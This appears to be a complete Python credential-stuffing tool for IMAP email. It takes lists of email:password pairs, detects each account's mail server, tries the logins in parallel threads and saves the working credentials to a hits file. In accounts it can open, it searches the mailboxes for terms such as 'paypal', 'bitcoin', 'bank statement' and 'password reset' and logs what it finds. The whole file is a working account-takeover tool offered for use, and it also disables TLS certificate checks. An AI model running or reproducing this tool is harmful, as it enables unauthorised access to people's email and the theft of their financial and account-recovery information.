#!/usr/bin/env python3
"""
IMAP Account Checker
────────────────────
Reads email:password pairs from a file, auto-detects the IMAP server,
validates each account (hit / invalid) and optionally searches keywords.

Usage:
  python checker.py accounts.txt
  python checker.py accounts.txt -t 20 --timeout 8 -k "paypal,bitcoin,invoice"
  python checker.py accounts.txt -o results/ -k "password reset,bank"
"""

import imaplib
import ssl
import sys
import argparse
import socket
import re
import os
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

from providers import KNOWN_PROVIDERS, FALLBACK_PATTERNS

# ── ANSI colours ──────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

_print_lock = Lock()


def cprint(*args, **kwargs):
    with _print_lock:
        print(*args, **kwargs)


# ── Provider detection ────────────────────────────────────────────────────────

def resolve_fallback(domain: str, port: int = 993, timeout: int = 5):
    """Try common hostname patterns until one resolves via DNS."""
    for pattern in FALLBACK_PATTERNS:
        host = pattern.format(domain=domain)
        try:
            socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM,
                               proto=0, flags=socket.AI_ADDRCONFIG)
            return {"host": host, "port": port}
        except socket.gaierror:
            continue
    return None


def get_imap_config(email_addr: str, dns_timeout: int = 5):
    """Return IMAP config dict for the given email, or None if unknown."""
    domain = email_addr.split("@")[-1].lower().strip()
    if domain in KNOWN_PROVIDERS:
        return domain, KNOWN_PROVIDERS[domain]
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(dns_timeout)
    try:
        cfg = resolve_fallback(domain)
    finally:
        socket.setdefaulttimeout(old_timeout)
    return domain, cfg


# ── IMAP operations ───────────────────────────────────────────────────────────

def _make_ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def imap_login(host: str, port: int, user: str, password: str, timeout: int):
    """Try to connect and login. Returns (ok: bool, error: str | None)."""
    try:
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=_make_ssl_ctx(),
                                  timeout=timeout)
        conn.login(user, password)
        conn.logout()
        return True, None
    except imaplib.IMAP4.error as e:
        return False, str(e)
    except (ConnectionRefusedError, TimeoutError,
            socket.timeout, socket.gaierror, OSError) as e:
        return False, f"conn: {e}"
    except Exception as e:
        return False, f"err: {e}"


def search_keywords(host: str, port: int, user: str, password: str,
                    keywords: list[str], timeout: int) -> list[dict]:
    """Login, scan INBOX + other folders, return matching email summaries."""
    matches = []
    try:
        conn = imaplib.IMAP4_SSL(host, port, ssl_context=_make_ssl_ctx(),
                                  timeout=timeout)
        conn.login(user, password)

        # Collect folder names
        folders = ["INBOX"]
        try:
            _, raw_list = conn.list()
            for item in raw_list or []:
                if not item:
                    continue
                decoded = item.decode(errors="replace")
                # folder name is the last quoted or unquoted token
                m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', decoded)
                if m:
                    folder = (m.group(1) or m.group(2)).strip().strip('"')
                    if folder and folder not in folders:
                        folders.append(folder)
        except Exception:
            pass

        for folder in folders[:8]:  # cap to avoid very large mailboxes
            try:
                conn.select(folder, readonly=True)
            except Exception:
                continue

            for kw in keywords:
                for criterion in [f'SUBJECT "{kw}"', f'TEXT "{kw}"']:
                    try:
                        _, ids_raw = conn.search(None, criterion)
                        msg_ids = ids_raw[0].split() if ids_raw and ids_raw[0] else []
                        for mid in msg_ids[:5]:  # max 5 per keyword/criterion
                            try:
                                _, data = conn.fetch(
                                    mid,
                                    "(BODY[HEADER.FIELDS (SUBJECT FROM DATE)])"
                                )
                                if not data or not data[0]:
                                    continue
                                header = data[0][1].decode(errors="replace")
                                subj_m = re.search(r"Subject:\s*(.+)", header, re.IGNORECASE)
                                frm_m  = re.search(r"From:\s*(.+)", header, re.IGNORECASE)
                                subj = subj_m.group(1).strip()[:120] if subj_m else "N/A"
                                frm  = frm_m.group(1).strip()[:80]  if frm_m  else "N/A"
                                matches.append({
                                    "keyword": kw,
                                    "folder":  folder,
                                    "subject": subj,
                                    "from":    frm,
                                })
                            except Exception:
                                continue
                    except Exception:
                        continue

        conn.logout()
    except Exception:
        pass
    return matches


# ── Worker ────────────────────────────────────────────────────────────────────

def check_account(line: str, idx: int, total: int,
                  keywords: list[str], timeout: int,
                  hits_fh, invalids_fh, keywords_fh,
                  stats: dict):
    line = line.strip()
    if not line or ":" not in line:
        return

    # Split on first colon only (passwords may contain colons)
    email, _, password = line.partition(":")
    email = email.strip()
    password = password.strip()

    if not email or not password or "@" not in email:
        return

    domain, cfg = get_imap_config(email)
    prefix = f"[{idx}/{total}]"

    if cfg is None:
        cprint(f"{DIM}{prefix} {YELLOW}UNKNOWN {RESET}{email}  "
               f"(no IMAP server found for {domain})")
        with _print_lock:
            stats["unknown"] += 1
        return

    host, port = cfg["host"], cfg["port"]
    ok, err = imap_login(host, port, email, password, timeout)

    with _print_lock:
        hits = stats["hits"]

    if ok:
        with _print_lock:
            stats["hits"] += 1
            hits = stats["hits"]

        cprint(f"{prefix} {BOLD}{GREEN}HIT{RESET}  {email}  "
               f"{DIM}[{host}]{RESET}  "
               f"{GREEN}HITS: {hits}{RESET}")
        with _print_lock:
            hits_fh.write(f"{email}:{password}\n")
            hits_fh.flush()

        # Keyword search for valid accounts
        if keywords:
            found = search_keywords(host, port, email, password, keywords, timeout + 10)
            if found and keywords_fh:
                with _print_lock:
                    keywords_fh.write(f"\n=== {email} ===\n")
                    for m in found:
                        keywords_fh.write(
                            f"  [{m['keyword']}] {m['folder']} | "
                            f"FROM: {m['from']} | SUBJ: {m['subject']}\n"
                        )
                    keywords_fh.flush()
                cprint(f"    {CYAN}↳ {len(found)} keyword match(es) saved{RESET}")
    else:
        with _print_lock:
            stats["invalids"] += 1
        cprint(f"{DIM}{prefix} INVALID  {email}  ({err}){RESET}")
        with _print_lock:
            invalids_fh.write(f"{email}:{password}\n")
            invalids_fh.flush()


# ── Entry point ───────────────────────────────────────────────────────────────

def banner():
    print(f"""
{BOLD}{CYAN}╔{'═' * 42}╗
║        IMAP Account Checker              ║
╚{'═' * 42}╝{RESET}
""")


def parse_args():
    p = argparse.ArgumentParser(
        description="IMAP credential checker with keyword search",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python checker.py accounts.txt
  python checker.py accounts.txt -t 30 --timeout 8
  python checker.py accounts.txt -k "paypal,bitcoin,invoice" -o results/
  python checker.py accounts.txt -t 50 -k "password,bank statement"
        """
    )
    p.add_argument("input", help="File with email:password lines")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="Concurrent threads (default: 10)")
    p.add_argument("--timeout", type=int, default=10,
                   help="IMAP connection timeout in seconds (default: 10)")
    p.add_argument("-k", "--keywords",
                   help="Comma-separated keywords to search in valid mailboxes")
    p.add_argument("-o", "--output", default="results",
                   help="Output directory (default: results/)")
    return p.parse_args()


def main():
    banner()
    args = parse_args()

    input_path = Path(args.input)
    if not input_path.exists():
        print(f"{RED}Error: file not found: {args.input}{RESET}")
        sys.exit(1)

    lines = [l for l in input_path.read_text(errors="replace").splitlines()
             if l.strip() and ":" in l]

    if not lines:
        print(f"{YELLOW}No valid email:password lines found in {args.input}{RESET}")
        sys.exit(0)

    keywords = [k.strip() for k in args.keywords.split(",") if k.strip()] \
        if args.keywords else []

    out_dir = Path(args.output)
    out_dir.mkdir(parents=True, exist_ok=True)

    hits_path     = out_dir / "hits.txt"
    invalids_path = out_dir / "invalids.txt"
    kw_path       = out_dir / "keywords.txt" if keywords else None

    print(f"  {BOLD}Input   {RESET}: {input_path} ({len(lines)} accounts)")
    print(f"  {BOLD}Threads {RESET}: {args.threads}")
    print(f"  {BOLD}Timeout {RESET}: {args.timeout}s")
    if keywords:
        print(f"  {BOLD}Keywords{RESET}: {', '.join(keywords)}")
    print(f"  {BOLD}Output  {RESET}: {out_dir}/\n")

    stats = {"hits": 0, "invalids": 0, "errors": 0, "unknown": 0}
    start = time.time()

    with (open(hits_path,     "w") as hits_fh,
          open(invalids_path, "w") as invalids_fh,
          (open(kw_path, "w") if kw_path else open(os.devnull, "w")) as kw_fh):

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {
                pool.submit(
                    check_account,
                    line, idx + 1, len(lines),
                    keywords, args.timeout,
                    hits_fh, invalids_fh,
                    kw_fh if kw_path else None,
                    stats
                ): line
                for idx, line in enumerate(lines)
            }
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    with _print_lock:
                        stats["errors"] += 1
                    cprint(f"{RED}Worker error: {e}{RESET}")

    elapsed = time.time() - start
    total_checked = stats["hits"] + stats["invalids"] + stats["unknown"] + stats["errors"]

    print(f"""
{BOLD}{'═' * 50}{RESET}
  {GREEN}{BOLD}HITS     {RESET}: {stats['hits']}
  {RED}Invalid  {RESET}: {stats['invalids']}
  {YELLOW}Unknown  {RESET}: {stats['unknown']}
  Total    : {total_checked} / {len(lines)}
  Time     : {elapsed:.1f}s
{BOLD}{'═' * 50}{RESET}

  {BOLD}hits.txt    {RESET}→ {hits_path}
  {BOLD}invalids.txt{RESET}→ {invalids_path}""")
    if kw_path and stats["hits"]:
        print(f"  {BOLD}keywords.txt{RESET}→ {kw_path}")
    print()


if __name__ == "__main__":
    main()
